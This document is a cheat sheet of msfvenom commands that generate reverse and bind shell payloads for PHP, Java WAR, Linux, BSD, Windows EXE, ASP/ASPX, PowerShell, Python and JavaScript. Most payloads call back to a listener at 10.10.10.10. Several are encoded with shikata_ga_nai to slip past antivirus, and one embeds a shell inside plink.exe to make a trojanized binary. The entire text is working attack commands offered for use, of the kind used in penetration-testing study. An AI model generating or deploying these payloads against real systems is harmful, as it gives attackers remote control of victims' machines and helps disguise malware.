# MSFVenom Commands

## PHP reverse shell

msfvenom -p php/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php

## Java WAR reverse shell

msfvenom -p java/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war

## Linux bind shell

msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata\_ga\_nai

## Linux FreeBSD reverse shell

msfvenom -p bsd/x64/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf

## Linux C reverse shell

msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata\_ga\_nai -f c

## Windows non staged reverse shell

msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata\_ga\_nai -f exe -o non\_staged.exe

## Windows Staged (Meterpreter) reverse shell

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata\_ga\_nai -f exe -o meterpreter.exe

## Windows Python reverse shell

msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py

## Windows ASP reverse shell

msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata\_ga\_nai -o shell.asp

## Windows ASPX reverse shell

msfvenom -f aspx -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata\_ga\_nai -o shell.aspx

## Windows JavaScript reverse shell with nops

msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f js\_le -e generic/none -n 18

## Windows Powershell reverse shell

msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata\_ga\_nai -i 9 -f psh -o shell.ps1

## Windows reverse shell excluding bad characters

msfvenom -p windows/shell\_reverse\_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata\_ga\_nai

## Windows x64 bit reverse shell

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe

## Windows reverse shell embedded into plink

msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata\_ga\_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell\_reverse\_msf\_encoded\_embedded.exe
